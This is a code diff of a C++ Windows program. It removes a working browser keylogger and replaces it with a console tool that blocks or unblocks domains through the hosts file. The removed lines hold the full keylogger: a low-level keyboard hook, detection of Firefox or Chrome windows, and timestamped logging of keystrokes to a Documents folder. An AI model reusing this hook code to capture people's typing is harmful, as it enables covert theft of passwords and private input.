@@ -1,139 +1,92 @@
-#include <Windows.h>
-#include <fstream>
-#include <ctime>
-#include <iomanip>
-#include <locale>
 #include <iostream>
+#include <fstream>
 #include <string>
-#include <codecvt>
-#include <knownfolders.h>
-#include <shlobj.h>
 
-// Global variables
-std::ofstream logFile;
-HHOOK keyboardHook = nullptr;
-HWND browserWindow = nullptr;
-
-// Function to handle key press and write to log file
-void HandleKeyPress(DWORD vkCode)
+bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
 {
-    if (logFile.is_open() && browserWindow != nullptr && GetForegroundWindow() == browserWindow)
+    std::ofstream hostsFile(R"(C:\Windows\System32\drivers\etc\hosts)", std::ios_base::app);
+    if (hostsFile.is_open())
     {
-        logFile << vkCode << " ";
+        hostsFile << ipAddress << " " << domain << std::endl;
+        hostsFile.close();
+        return true;
     }
+    return false;
 }
 
-// Keyboard hook procedure
-LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
+bool RemoveHostEntry(const std::string& domain, const std::string& ipAddress)
 {
-    if (nCode >= 0)
-    {
-        // Extract key information from the event
-        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-        DWORD vkCode = pKeyboardStruct->vkCode;
+    std::ifstream input(R"(C:\Windows\System32\drivers\etc\hosts)");
+    std::ofstream output(R"(C:\Windows\System32\drivers\etc\hosts_temp)");
 
-        // Check if a key is being pressed (key down event)
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+    if (input.is_open() && output.is_open())
+    {
+        std::string line;
+        while (std::getline(input, line))
         {
-            // Handle the key press
-            HandleKeyPress(vkCode);
+            if (line.find(ipAddress + " " + domain) == std::string::npos)
+            {
+                output << line << std::endl;
+            }
         }
+
+        input.close();
+        output.close();
+
+        std::remove(R"(C:\Windows\System32\drivers\etc\hosts)");
+        std::rename(R"(C:\Windows\System32\drivers\etc\hosts_temp)", R"(C:\Windows\System32\drivers\etc\hosts)");
+
+        return true;
     }
 
-    // Pass the event to the next hook procedure
-    return CallNextHookEx(nullptr, nCode, wParam, lParam);
+    return false;
 }
 
-// Function to find the browser window
-BOOL CALLBACK EnumWindowsProc(HWND hwnd, [[maybe_unused]] LPARAM lParam)
+int main()
 {
-    char class_name[80];
-    GetClassName(hwnd, class_name, sizeof(class_name));
+    std::string domain;
+    std::string ipAddress;
 
-    std::string windowTitle;
-    char windowTitleBuffer[256];
-    GetWindowTextA(hwnd, windowTitleBuffer, sizeof(windowTitleBuffer));
-    windowTitle = windowTitleBuffer;
+    std::cout << "Menu:\n";
+    std::cout << "1. Block domain\n";
+    std::cout << "2. Unblock domain\n";
+    std::cout << "Enter your choice: ";
+    int choice;
+    std::cin >> choice;
 
-    // Check if the window belongs to a supported browser
-    if (windowTitle.find("Mozilla Firefox") != std::string::npos ||
-        windowTitle.find("Google Chrome") != std::string::npos)
+    switch (choice)
     {
-        // Store the browser window handle
-        browserWindow = hwnd;
-        return FALSE;
+        case 1:
+            std::cout << "Enter the domain to block: ";
+            std::cin >> domain;
+            ipAddress = "0.0.0.0";
+            if (AddHostEntry(domain, ipAddress))
+            {
+                std::cout << "Domain blocked successfully." << std::endl;
+            }
+            else
+            {
+                std::cout << "Failed to block domain." << std::endl;
+            }
+            break;
+        case 2:
+            std::cout << "Enter the domain to unblock: ";
+            std::cin >> domain;
+            std::cout << "Enter the IP address to unblock: ";
+            std::cin >> ipAddress;
+            if (RemoveHostEntry(domain, ipAddress))
+            {
+                std::cout << "Domain unblocked successfully." << std::endl;
+            }
+            else
+            {
+                std::cout << "Failed to unblock domain." << std::endl;
+            }
+            break;
+        default:
+            std::cout << "Invalid choice." << std::endl;
+            break;
     }
 
-    return TRUE;
-}
-
-// Entry point of the application
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
-{
-    // Get the current application path
-    char appPath[MAX_PATH];
-    GetModuleFileNameA(nullptr, appPath, sizeof(appPath));
-
-    // Get the "Documents" folder path
-    PWSTR documentsPath = nullptr;
-    if (FAILED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath)))
-    {
-        MessageBox(nullptr, "Failed to get the Documents folder path.", "Error", MB_OK | MB_ICONERROR);
-        return -1;
-    }
-
-    // Convert wide string to narrow string
-    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
-    std::string documentsPathStr = converter.to_bytes(documentsPath);
-
-    // Create the "KeyLogs" directory in the "Documents" folder
-    std::string keyLogsDir = documentsPathStr + "\\KeyLogs";
-    CreateDirectoryA(keyLogsDir.c_str(), nullptr);
-
-    // Create a filename based on the current date and time
-    std::stringstream ss;
-    std::time_t currentTime = std::time(nullptr);
-    std::tm* localTime = std::localtime(&currentTime);
-    ss << keyLogsDir << "\\LOG"
-       << std::put_time(localTime, "%Y%m%d_%H%M%S")
-       << ".txt";
-
-    // Open the log file in append mode
-    logFile.open(ss.str(), std::ios_base::app);
-    if (!logFile.is_open())
-    {
-        MessageBox(nullptr, "Failed to open the log file.", "Error", MB_OK | MB_ICONERROR);
-        return -1;
-    }
-
-    // Enumerate all windows to find the browser window
-    EnumWindows(EnumWindowsProc, NULL);
-
-    if (browserWindow == nullptr)
-    {
-        MessageBox(nullptr, "No supported browser window found.", "Error", MB_OK | MB_ICONERROR);
-        return -1;
-    }
-
-    // Set up the keyboard hook
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(nullptr), 0);
-    if (keyboardHook == nullptr)
-    {
-        MessageBox(nullptr, "Failed to set up the keyboard hook.", "Error", MB_OK | MB_ICONERROR);
-        return -1;
-    }
-
-    // Message loop
-    MSG msg;
-    while (GetMessage(&msg, nullptr, 0, 0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    // Clean up
-    UnhookWindowsHookEx(keyboardHook);
-    logFile.close();
-
-    return static_cast<int>(msg.wParam);
+    return 0;
 }
